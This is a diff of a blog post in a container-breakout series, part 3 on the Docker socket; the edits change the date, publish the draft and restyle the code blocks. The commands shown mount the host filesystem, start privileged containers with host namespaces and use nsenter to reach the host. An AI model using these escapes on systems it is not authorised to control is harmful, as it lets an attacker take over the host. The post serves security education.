@@ -1,7 +1,7 @@
 ---
 title: "Container Breakouts – Part 3: Docker Socket"
-date: 2020-06-29T11:56:35+02:00
-draft: true
+date: 2020-07-30T14:20:35+02:00
+draft: false
 tags:
 - docker
 - breakout
@@ -33,15 +33,15 @@ So if you want to escalate from the container to the system, you can **interact*
 
 First at all I will start with a short re-cap. We can start containers with the root directory mounted into the container. To do so, one must run the following command and continue reading with [Part 1](../container-breakouts-part1) of this series.
 
-```
-# docker run --rm -it -v/:/hostfs ubuntu bash
+```bash
+~# docker run --rm -it -v/:/hostfs ubuntu bash
 root@95bc051624b9:/# 
 ``` 
 
 The alternative would be to start a privileged container. This privileged container can interact with the kernel without limitations. To do so, one must run the following command and continue reading with [Part 2](../container-breakouts-part2) of this series.
 
-```
-# docker run --rm --privileged -it ubuntu bash   
+```bash
+~# docker run --rm --privileged -it ubuntu bash   
 root@aad2c9378900:/#
 ```
 
@@ -64,8 +64,8 @@ The [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker/) recomme
 
 If we want to break out of the container to get full system access we **start** a new **container with all (possible) namespaces** from the host via the docker socket. Only the `mnt` namespace cannot be set at container startup. Since we start our container **privileged**, there is no seccomp filter in place and we can use `nsenter` to **switch** to **mount namespace** of the `init` process.
 
-```
-# ls -l /proc/self/ns/
+```bash
+~# ls -l /proc/self/ns/
 total 0
 lrwxrwxrwx 1 user user 0 Jul 15 09:02 cgroup -> 'cgroup:[4026531835]'
 lrwxrwxrwx 1 user user 0 Jul 15 09:02 ipc -> 'ipc:[4026532376]'
@@ -76,7 +76,7 @@ lrwxrwxrwx 1 user user 0 Jul 15 09:02 pid_for_children -> 'pid:[4026532377]'
 lrwxrwxrwx 1 user user 0 Jul 15 09:02 user -> 'user:[4026531837]'
 lrwxrwxrwx 1 user user 0 Jul 15 09:02 uts -> 'uts:[4026532375]'
 
-# docker run --rm -it --privileged --network host --pid host --ipc host --uts host ubuntu  bash
+~# docker run --rm -it --privileged --network host --pid host --ipc host --uts host ubuntu  bash
 
 root@arch:/# nsenter -t 1 -m
 
